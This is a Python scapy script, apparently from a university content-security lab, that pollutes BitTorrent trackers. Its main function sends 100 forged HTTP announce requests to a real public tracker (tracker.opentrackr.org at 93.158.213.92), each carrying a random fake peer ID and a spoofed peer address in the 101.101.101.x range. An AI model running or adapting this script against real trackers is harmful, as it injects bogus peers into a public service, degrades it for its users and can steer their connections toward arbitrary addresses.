from scapy.all import *
from bt_protocol_restore.convert import *
from bt_protocol_restore.Protocol_Restore import *
import random
import string
class send_pollution:


    def send_udp_announce(self, dst):
        eth = Ether()
        IPlayer = IP( dst=dst)
        UDPlayer = UDP(sport=54066, dport = 80)
        # with open("D:\JuniorSpring\信息内容安全\contentSecurityLab\\test\\"+dst+".txt","rb") as f:
        #     data = f.read()
        # ip_addr = "45.168.249.205"
        # ip = socket.inet_aton(ip_addr)
        # data = exchange_bytes(bytearray(data), 84, 4, bytearray(ip))
        # peer_id_array = bytearray(os.urandom(20))
        # data = exchange_bytes(bytearray(data), 36, 20, peer_id_array)
        data = '123435'
        pkt = IPlayer / UDPlayer / data
        send(pkt)

    def send_http_announce(self, dst):
        ip = '101.101.101.'
        for i in range(100):
            IPlayer = IP(dst=dst)
            TCPlayer = TCP(sport=54118+i, dport=1337)
            newip = ip+str(i)
            peer_id = '-qB4250-' + generate_random_str(12)
            data = "GET /announce?info_hash=%ceb6%be%c49x%16%b8%89G%92%ad2%a1%99F%9e%ba%80&peer_id="+peer_id+"&ip="+newip+"&port=64997&uploaded=0&downloaded=21511128&left=0&corrupt=0&key=A004ACC7&event=started&numwant=200&compact=1&no_peer_id=1&supportcrypto=1&redundant=0 HTTP/1.1\r\nHost: tracker.opentrackr.org:1337\r\nUser-Agent: qBittorrent/4.2.5\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'"
            pkt = IPlayer / TCPlayer / data
            send(pkt)
            time.sleep(0.01)

def generate_random_str(randomlength=16):
    """
    生成一个指定长度的随机字符串，其中
    string.digits=0123456789
    string.ascii_letters=abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
    """
    str_list = [random.choice(string.digits + string.ascii_letters) for i in range(randomlength)]
    random_str = ''.join(str_list)
    return random_str


if __name__ == '__main__':
    send_pollution().send_http_announce('93.158.213.92')